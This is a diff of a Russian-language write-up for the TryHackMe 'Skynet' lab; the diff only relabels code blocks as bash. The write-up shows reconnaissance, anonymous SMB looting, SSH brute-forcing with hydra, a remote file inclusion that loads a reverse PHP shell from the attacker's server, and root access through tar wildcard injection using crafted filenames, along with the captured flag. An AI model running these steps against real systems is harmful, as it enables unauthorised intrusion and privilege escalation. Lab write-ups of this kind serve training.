@@ -23,7 +23,7 @@ export ip=10.10.60.59 && nmap_ctf $ip
 ```
 
 ### nmap
-```
+```bash
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -86,7 +86,7 @@ Host script results:
 ## 🕵️ Enumeration
 
 ### ffuf
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/scans]
 └─$ ffuf -fc 404 -t 100 -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -u http://$ip:80/FUZZ -o ffuf.txt
 
@@ -122,7 +122,7 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration:
 ```
 
 ### smb
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/scans]
 └─$ smbclient -L $ip -U ""
 Password for [WORKGROUP\]:
@@ -144,7 +144,7 @@ Reconnecting with SMB1 for workgroup listing.
 ```
 
 ### smb shares
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/scans]
 └─$ smbclient \\\\$ip\\anonymous -U ""
 Password for [WORKGROUP\]:
@@ -172,7 +172,7 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
 
 attention.txt
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/scans]
 └─$ cat attention.txt 
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
@@ -180,7 +180,7 @@ A recent system malfunction has caused various passwords to be changed. All skyn
 ```
 
 log1.txt - похоже тут пароли, log2.txt и log3.txt - пустые
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Easy - Skynet/scans/logs]
 └─$ cat log1.txt     
 cyborg007haloterminator
@@ -220,7 +220,7 @@ Walterminator
 
 ### ssh
 brute ssh не дал результатов
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Easy - Skynet/scans/logs]
 └─$ hydra -l milesdyson -P ./log1.txt -t 40 -vV ssh://$ip
 ```
@@ -232,7 +232,7 @@ brute ssh не дал результатов
 ![inbox](screenshots/02.inbox.png)
 
 smb pass ")s{A&2Z=F^n_E.B`"
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Easy - Skynet/scans/logs]
 └─$ smbclient \\\\$ip\\milesdyson -U "milesdyson"
 Password for [WORKGROUP\milesdyson]:
@@ -249,7 +249,7 @@ smb: \> dir
 ```
 
 в директории notes был файл **important.txt**
-```
+```bash
 smb: \notes\> more important.txt
 1. Add features to beta CMS /45kra24zxs28v3yd
 2. Work on T-800 Model 101 blueprints
@@ -266,7 +266,7 @@ smb: \notes\> more important.txt
 ## 📂 Получение доступа
 
 Скачиваю реверс php и запускаю сервер
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/exploits]
 └─$ python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
@@ -276,7 +276,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 `http://10.10.60.59/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.21.104.16:8888/reverse.php`
 
 Ловлю в nc и улучшаю shell через python
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - Skynet/exploits]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -294,7 +294,7 @@ $ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 Флаг
-```
+```bash
 www-data@skynet:/home/milesdyson$ cat user.txt
 cat user.txt
 7ce5c2109a40f958099283600a9ae807
@@ -304,7 +304,7 @@ cat user.txt
 ## ⚙️ Привилегии
 
 Загрузил linPEAS, проверил **Pkexec binary has SUID bit set**
-```
+```bash
 ══╣ Polkit Binary
 Pkexec binary found at: /usr/bin/pkexec                                                                           
 Pkexec binary has SUID bit set!
@@ -313,7 +313,7 @@ pkexec version 0.105
 ```
 
 Не прошло
-```
+```bash
 www-data@skynet:/home/milesdyson$ pkexec /bin/sh
 pkexec /bin/sh
 ==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
@@ -329,7 +329,7 @@ This incident has been reported.
 ```
 
 далее смотрю cron, есть интересная **/home/milesdyson/backups/backup.sh**
-```
+```bash
 ╔══════════╣ Check for vulnerable cron jobs
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs              
 ══╣ Cron jobs list                                                                                                
@@ -348,7 +348,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
 Права для backup.sh
-```
+```bash
 www-data@skynet:/home/milesdyson/backups$ ls -la
 ls -la
 total 4584
@@ -359,20 +359,20 @@ drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
 ```
 
 содержимое backup.sh
-```
+```bash
 #!/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 ```
 
 Перезаписать нельзя, но есть интересный способ, основанный на том, как обрабатывается `*` в **tar**
-```
+```bash
 echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/evil.sh
 touch "/var/www/html/--checkpoint-action=exec=sh evil.sh"
 touch "/var/www/html/--checkpoint=1"
 ```
 
-```
+```bash
 www-data@skynet:/var/www/html$ ls -la
 ls -la
 total 72
@@ -392,13 +392,13 @@ drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
 -rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
 ```
 
-```
+```bash
 www-data@skynet:/var/www/html$ ls -la /bin/bash
 ls -la /bin/bash
 -rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
 ```
 
-```
+```bash
 www-data@skynet:/var/www/html$ /bin/bash -p
 /bin/bash -p
 bash-4.3# whoami
